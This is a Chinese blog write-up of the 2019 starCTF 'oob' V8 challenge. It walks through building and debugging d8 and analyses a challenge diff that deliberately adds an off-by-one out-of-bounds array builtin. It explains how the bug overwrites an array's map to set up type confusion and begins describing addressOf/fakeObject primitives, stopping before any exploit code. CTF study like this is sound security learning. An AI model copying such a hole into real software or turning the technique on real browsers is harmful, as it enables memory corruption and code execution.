<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>V8 重新入门-2019 starCTF oob 题解 | LYYL' Blog</title><meta name="keywords" content="LYYL, Blog, Pwn, pwn"><meta name="author" content="LYYL"><meta name="copyright" content="LYYL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="CTF WriteUp">
<meta property="og:type" content="article">
<meta property="og:title" content="V8 重新入门-2019 starCTF oob 题解">
<meta property="og:url" content="https://www.lyyl.online/posts/1029211104.html">
<meta property="og:site_name" content="LYYL&#39; Blog">
<meta property="og:description" content="CTF WriteUp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg">
<meta property="article:published_time" content="2021-11-05T14:20:21.000Z">
<meta property="article:modified_time" content="2022-05-26T07:56:59.326Z">
<meta property="article:author" content="LYYL">
<meta property="article:tag" content="LYYL, Blog, Pwn, pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg"><link rel="shortcut icon" href="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png"><link rel="canonical" href="https://www.lyyl.online/posts/1029211104"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-8740935439028405',
  enable_page_level_ads: 'true'
});</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-MBZHBXMDJ2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-MBZHBXMDJ2');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'V8 重新入门-2019 starCTF oob 题解',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-26 15:56:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">LYYL' Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">V8 重新入门-2019 starCTF oob 题解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-11-05T14:20:21.000Z" title="undefined 2021-11-05 22:20:21">2021-11-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/V8/">V8</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>25分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="V8 重新入门-2019 starCTF oob 题解"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>一年多前调试的V8的题目了，都忘光了，只记得用了类型混淆，难搞，准备看之前做2019年的*ctf的oob这道题目重新入门一下（这个题解之前的博客上有，但是因为我重新弄了一个博客图床变了，有时间再全迁移到新的上面），不知道V8又多了什么保护机制啥的。</p>
<h2 id="编译V8"><a href="#编译V8" class="headerlink" title="编译V8"></a>编译V8</h2><p>额，编译<code>V8</code>就是个大坑。。。</p>
<p><code>V8</code>是<code>chrome</code>中的<code>JS</code>解释器，经过<code>v8</code>编译之后的可执行文件为<code>d8</code>。下载源码的过程需要连接外网，因此可以通过设置代理或者直接在云服务器上操作。</p>
<p>首先安装一些之后用到的工具</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/path/to/depot_tools&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br><span class="line"><span class="built_in">cd</span> ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="comment"># clone并且configure</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/path/to/ninja&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>

<p>接下来就是下载源码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">fetch v8</span><br></pre></td></tr></table></figure>

<p>下载源码过程中中断的话，可以使用<code>gclient syc</code>继续下载。</p>
<blockquote>
<p> 这里我使用的是主机的代理，在系统选项中设置好即可(<code>all_proxy</code>环境变量设置)。但是<code>gclinet syc</code>中的某些命令在设置完代理之后也无法连接<code>google</code>的服务器，这里将<code>download_from_google_storage.py</code>中的下载改写为调用<code>wget</code>下载（<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/liuzhongchina521/BlogAttachment/tree/master/starCTF2019/oob">改写后的脚本</a>）</p>
</blockquote>
<p>在编译之前需要将源码的版本<code>reset</code>到和题目一致的版本，并将题目给出的<code>diff</code>文件应用到源码中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">git apply &lt; oob.diff</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tools/dev/v8gen.py x64.debug</span><br><span class="line">sudo ../../ninja/ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure>

<p>这里编译时出现了错误</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/60dfaa7d97c54078fa8a370f69ca305.png" alt="图片无法显示，请联系作者" title=" ">

<p>应该是<code>gcc/libc</code>版本的问题，在<code>ubuntu 16.04</code>成功编译。</p>
<h2 id="调试V8"><a href="#调试V8" class="headerlink" title="调试V8"></a>调试V8</h2><p><code>V8</code>的官方团队编写了调试<code>V8</code>用的<code>gdbinit</code>，位于<code>tools</code>目录之下，在<code>gdbinit</code>中添加<code>source</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /home/pwn/Desktop/v8/v8-<span class="built_in">source</span>/v8/tools/gdbinit</span><br><span class="line"><span class="built_in">source</span> /home/pwn/Desktop/v8/v8-<span class="built_in">source</span>/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure>

<p>在调试时使用<code>allow-natives-syntax</code>能够定义一些<code>V8</code>运行时支持的函数，便于调试。一般调试为<code>gdb ./d8;set args --allow-natives-syntax ./test.js</code>。使用<code>%DebugPrint(var)</code>来输出变量的详细信息，使用<code>%SystemBreak()</code>触发调试中断。<code>job</code>可以可视化的显示<code>JS</code>对象的内存结构，<code>telescope addr [count]</code>可用来输出<code>addr</code>地址之后<code>count</code>长度的内存数据。这里需要注意的是在<code>release</code>版本下没有调试符号没办法调用<code>job</code>命令。编写一个<code>test.js</code>用来调试</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%<span class="title class_">DebugPrint</span>(b);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%<span class="title class_">DebugPrint</span>(c);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></figure>

<p><code>gdb</code>运行<code>d8</code></p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200803222551.png" alt="图片无法显示，请联系作者" title=" ">

<p>首先打印出了变量<code>a</code>的内存地址，接着进入了第一次调试。我们看一下<code>a</code>的内存结构</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x3d31081081d5</span><br><span class="line">0x3d31081081d5: [JSArray]</span><br><span class="line"> - map: 0x3d31082c3865 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3d310828b2b9 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3d31082920b5 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x3d31080426e5 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    0x3d310804464d: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x3d3108202161 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3d31082920b5 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>map</code>表示了当前结构体的类型，<code>elements</code>表示对象元素，存储数据的地方，<code>length</code>表示元素的个数，<code>properties</code>为属性。这里需要注意的是<code>V8</code>中只有数字和对象两种结构，为了区分二者，<code>V8</code>在所有的对象的内存地址的末尾都加了<code>1</code>。因此该对象的内存地址为<code>0x3d31081081d4</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">DebugPrint: 0x3d3108108209: [JSArray]</span><br><span class="line"> - map: 0x3d31082c3905 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3d310828b2b9 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3d31081081e9 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x3d31080426e5 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    0x3d310804464d: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x3d3108202161 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3d31081081e9 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>int</code>类型和<code>double</code>类型的数组的数据结构相似，<code>elements</code>对象的地址就在<code>array</code>结构的不远处。下面再看看对象数组的结构体</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">DebugPrint: 0x3d3108108229: [JSArray]</span><br><span class="line"> - map: 0x3d31082c3955 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3d310828b2b9 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3d3108108219 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 2</span><br><span class="line"> - properties: 0x3d31080426e5 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    0x3d310804464d: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x3d3108202161 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3d3108108219 &lt;FixedArray[2]&gt; &#123;</span><br><span class="line">           0: 0x3d31081081d5 &lt;JSArray[3]&gt;</span><br><span class="line">           1: 0x3d3108108209 &lt;JSArray[3]&gt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到在<code>elements</code>中存储的是两个数组的地址。从上面的分析中我们可以得到不同类型数组的<code>map</code>值是不同的。存储数据的<code>elements</code>对象的地址在数组地址之前，可见首先是分配了存储数据的<code>elements</code>对象，在分配了结构体的内存。</p>
<h3 id="V8对象结构"><a href="#V8对象结构" class="headerlink" title="V8对象结构"></a>V8对象结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elements-------&gt;MAP</span><br><span class="line">				Length</span><br><span class="line">				element_1</span><br><span class="line">				...</span><br><span class="line">				element_n</span><br><span class="line">ArrayObject----&gt;MAP</span><br><span class="line">				ProtoType</span><br><span class="line">				elements指针</span><br><span class="line">				Length</span><br><span class="line">				properties</span><br></pre></td></tr></table></figure>



<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>浏览器的<code>CTF</code>一般会采用两种方式，一种是直接给出一个<code>cve</code>漏洞，另一个就是给出一个<code>diff</code>文件，这需要我们自己去下载<code>commit</code>的源码，编译得到<code>diff</code>补丁过的浏览器程序。<code>oob</code>就给出了一个<code>diff</code>文件，这个我们已经编译完成。下面我们分析一下<code>diff</code>文件。</p>
<p>首先先是注册了<code>oob</code>函数，在内部表示为<code>kArrayOob</code></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br></pre></td></tr></table></figure>

<p>接着实现了具体的<code>oob</code>函数</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br></pre></td></tr></table></figure>

<p>后面的代码将该函数与<code>kArrayOob</code>关联起来。我们主要分析一下<code>oob</code>函数的实现。因为<code>C++</code>成员变量的第一个参数一定是<code>this</code>指针。因此当函数的参数大于<code>1</code>的时候直接返回，当参数没有参数的时候返回<code>length</code>地址处的内容，当参数等于<code>1</code>的时候将第一个参数写入数组的第<code>length</code>位置。</p>
<p>由于数组是从<code>0</code>开始计数的，因此写入第<code>length</code>个位置的时候就存在<code>off-by-one</code>漏洞。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2.2</span>,<span class="number">3</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">a.<span class="title function_">oob</span>();</span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第一次调试</span></span><br><span class="line">a.<span class="title function_">oob</span>(<span class="number">3</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="title function_">toString</span>());</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第二次调试</span></span><br></pre></td></tr></table></figure>

<p>运行到第二次调试之后</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200804204842.png" alt="图片无法显示，请联系作者" title=" ">

<p>我们可以看到数组存储数据的<code>elements</code>的第<code>length</code>个数据已经被改写为了参数<code>1</code>的浮点类型。并且可以注意到此时覆写的恰好就是数组结构的<code>MAP</code>类型。同时如果将<code>a.oob()</code>输出的浮点值转换为<code>16</code>进制可以得知其就是<code>MAP</code>的值，也就是可以任意读写<code>MAP</code>的属性值。</p>
<blockquote>
<p>只有浮点类型的数组，数组结构和elements的结构相邻</p>
</blockquote>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>从上述我们可以任意读写数组结构的<code>MAP</code>值，我们可以利用”类型混淆”漏洞。即利用<code>oob</code>将<code>A</code>类型的<code>MAP</code>值读取出来并写入到<code>B</code>类型的<code>MAP</code>区域中，就会导致<code>B</code>对象变成了<code>A</code>对象的数据类型，<code>V8</code>就会按照处理<code>A</code>对象的方法处理<code>B</code>对象的相关数据和结构体。</p>
<p>当我们将一个对象数组<code>B</code>的类型改写为浮点类型数据的时候，访问<code>B[0]</code>返回的就是<code>B[0]</code>对象的内存地址了；同理当我们将浮点类型数组<code>A</code>改写为对象数组的时候，访问<code>A[0]</code>就是以<code>A[0]</code>为内存地址的一个<code>JS</code>对象了。</p>
<h3 id="编写addressOf和fakeObject"><a href="#编写addressOf和fakeObject" class="headerlink" title="编写addressOf和fakeObject"></a>编写addressOf和fakeObject</h3><p>要编写的两个功能原语<code>addressOf</code>用来泄露某个对象的地址，<code>fakeObject</code>则将一个内存地址伪造为一个对象。</p>
<p>首先定义两个全局对象，获取其对象的<code>MAP</code>值</p>
